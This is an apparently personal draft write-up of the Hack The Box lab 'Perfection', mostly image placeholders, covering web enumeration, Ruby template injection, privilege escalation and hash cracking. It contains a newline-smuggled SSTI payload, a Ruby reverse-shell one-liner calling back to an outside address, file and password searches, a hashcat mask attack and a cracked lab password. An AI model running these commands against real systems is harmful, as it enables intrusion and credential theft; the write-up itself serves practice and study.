---
title: HTB-Perfection
draft: false
tags:
  - htb
  - linux
  - easy
---
Picture here

## Information Gathering
### Rustscan



## Enumeration

### HTTP - TCP 80

![alt text](image.png)


`/weighted-grade`

![alt text](image-1.png)

![alt text](image-2.png)

## Ruby SSTI



Fuzzing with https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz


![alt text](image-3.png)

![alt text](image-4.png)


<%= 7 * 7 %>

![alt text](image-5.png)

![alt text](image-6.png)

Ruby SSTI

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby


change the order of how the information is submitted and I was then able to inject newlines and get past the filtering & ruby payload

```ruby
a
<%=system("pwd");%>
```

![alt text](image-7.png)

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

## SSTI Reverse Shell


https://www.revshells.com/

`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.14",1337))'`

![alt text](image-11.png)

`python3 -c 'import pty; pty.spawn("/bin/sh")'`


## Privesc: susan to root

![alt text](image-12.png)

![alt text](image-13.png)

Add below to jadu privesc part

`find / -uid 1001 -type f -ls 2>/dev/null | grep -v "/proc*"`

![alt text](image-14.png)


`find / -name "*susan*" -type f -ls 2>/dev/null`

![alt text](image-15.png)

`grep -i password -R .`

![alt text](image-16.png)

![alt text](image-12.png)

![alt text](image-13.png)

![alt text](image-17.png)

/var/mail/susan

![alt text](image-18.png)

## Hash Cracking



picture here

`hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d`

picture here


susan_nasus_413759210


![alt text](image-19.png)